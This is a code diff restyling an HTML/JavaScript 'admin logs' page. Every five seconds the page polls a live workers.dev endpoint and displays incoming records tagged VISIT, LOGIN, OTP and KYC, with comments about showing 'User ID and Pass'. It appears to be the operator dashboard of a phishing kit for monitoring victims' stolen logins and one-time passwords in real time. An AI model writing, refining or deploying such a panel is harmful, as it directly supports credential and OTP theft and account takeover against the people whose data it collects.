@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Admin Dashboard</title>
+    <title>Live Admin Panel</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: #f0f2f5; padding-bottom: 40px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f4f7f6; padding-bottom: 50px; }
 
-        /* Sticky Header */
+        /* Header */
         .header {
-            background: #ffffff;
+            background: #315195;
+            color: white;
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
@@ -18,103 +19,94 @@
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
         }
-        .header h1 { font-size: 18px; color: #315195; font-weight: 700; }
-        
-        /* Visit Count Bubble */
-        .visit-badge {
-            background: #315195;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 14px;
-        }
+        .header h1 { font-size: 18px; font-weight: 700; }
+        .count-badge { background: #ff9800; padding: 4px 12px; border-radius: 20px; font-weight: 800; font-size: 14px; }
 
         .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }
 
-        /* Vertical Colourful Cards */
+        /* Card Styling */
         .card {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 16px;
+            background: #fff;
+            border-radius: 10px;
+            padding: 15px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            border-left: 6px solid #ccc;
-            animation: fadeIn 0.4s ease-out;
+            border-left: 6px solid #315195;
+            animation: slideIn 0.3s ease;
         }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* Dynamic Colors Based on Data Type */
-        .card-visit { border-left-color: #315195; background: #f0f4ff; }
-        .card-login { border-left-color: #28a745; background: #f1fff4; }
-        .card-otp   { border-left-color: #ff9800; background: #fffcf0; }
-        .card-kyc   { border-left-color: #e91e63; background: #fff0f5; }
-
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .tag { font-size: 11px; font-weight: 800; text-transform: uppercase; color: #555; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .tag { font-size: 11px; font-weight: 800; color: #315195; text-transform: uppercase; }
         .time { font-size: 10px; color: #999; }
 
-        /* Detailed Data View (Multi-line Support) */
-        .detail-box { 
+        /* Data Format: User ID & Pass */
+        .data-content { 
             font-size: 16px; 
-            color: #111; 
-            font-weight: 600; 
-            line-height: 1.6; 
-            white-space: pre-wrap; /* Yeh zaroori hai line change ke liye */
-            word-break: break-all;
+            color: #222; 
+            line-height: 1.8; 
+            white-space: pre-wrap; 
         }
+        .label { color: #555; font-weight: 500; font-size: 14px; }
+        .value { font-weight: 800; color: #000; }
 
-        /* Live Status Dot */
-        .live-status { text-align: center; margin-top: 15px; font-size: 11px; color: #666; }
-        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        /* Color classes */
+        .card-login { border-left-color: #28a745; }
+        .card-otp { border-left-color: #ff9800; }
+        .card-visit { border-left-color: #315195; }
+
+        .status-dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; animation: blink 1.5s infinite; margin-right: 5px; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .footer { text-align: center; font-size: 11px; color: #777; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>LIVE LOGS</h1>
-        <div class="visit-badge" id="totalVisits">0</div>
+        <h1>ADMIN LOGS</h1>
+        <div class="count-badge" id="vCount">Visits: 0</div>
     </div>
 
-    <div class="container" id="logsContainer">
+    <div class="container" id="logBox">
         </div>
 
-    <div class="live-status">
-        <span class="dot"></span> Updating automatically...
+    <div class="footer">
+        <span class="status-dot"></span> System Live | Auto-Refresh 5s
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function fetchLogs() {
+        async function updateLogs() {
             try {
-                const response = await fetch(workerURL);
-                const data = await response.json();
-                
-                const container = document.getElementById('logsContainer');
-                const visitDisplay = document.getElementById('totalVisits');
+                const res = await fetch(workerURL);
+                const logs = await res.json();
+                const box = document.getElementById('logBox');
+                const vDisplay = document.getElementById('vCount');
 
-                if (!data || data.length === 0) {
-                    container.innerHTML = "<p style='text-align:center; padding:40px; color:#999;'>No data found</p>";
+                if (!logs || logs.length === 0) {
+                    box.innerHTML = "<p style='text-align:center; padding:50px; color:#bbb;'>Waiting for new data...</p>";
                     return;
                 }
 
-                // Total Visit Counting
-                const visits = data.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
-                visitDisplay.innerText = visits;
+                // Count visits
+                const visits = logs.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
+                vDisplay.innerText = `Visits: ${visits}`;
 
-                // Render Logs (Newest on Top)
-                container.innerHTML = data.map(log => {
-                    let cardClass = "";
+                // Render Logs
+                box.innerHTML = logs.map(log => {
+                    let cardClass = "card-visit";
                     const type = String(log.type).toUpperCase();
+                    if(type.includes("LOGIN")) cardClass = "card-login";
+                    if(type.includes("OTP")) cardClass = "card-otp";
 
-                    if(type.includes("VISIT")) cardClass = "card-visit";
-                    else if(type.includes("LOGIN")) cardClass = "card-login";
-                    else if(type.includes("OTP")) cardClass = "card-otp";
-                    else if(type.includes("KYC")) cardClass = "card-kyc";
+                    // Formatting details for User ID and Pass
+                    let formattedDetail = log.detail;
+                    if(type.includes("LOGIN")) {
+                        // Agar worker se <br> aa raha hai toh usse clean karke dikhao
+                        formattedDetail = log.detail.replace(/<br>/g, '\n');
+                    }
 
                     return `
                         <div class="card ${cardClass}">
@@ -122,19 +114,16 @@
                                 <span class="tag">${log.type}</span>
                                 <span class="time">${log.time}</span>
                             </div>
-                            <div class="detail-box">${log.detail.replace(/<br>/g, '\n')}</div>
+                            <div class="data-content">${formattedDetail}</div>
                         </div>
                     `;
                 }).join('');
 
-            } catch (err) {
-                console.log("Sync error...");
-            }
+            } catch (e) { console.log("Updating..."); }
         }
 
-        // Auto Refresh logic (5 seconds)
-        setInterval(fetchLogs, 5000);
-        window.onload = fetchLogs;
+        setInterval(updateLogs, 5000);
+        window.onload = updateLogs;
     </script>
 </body>
 </html>
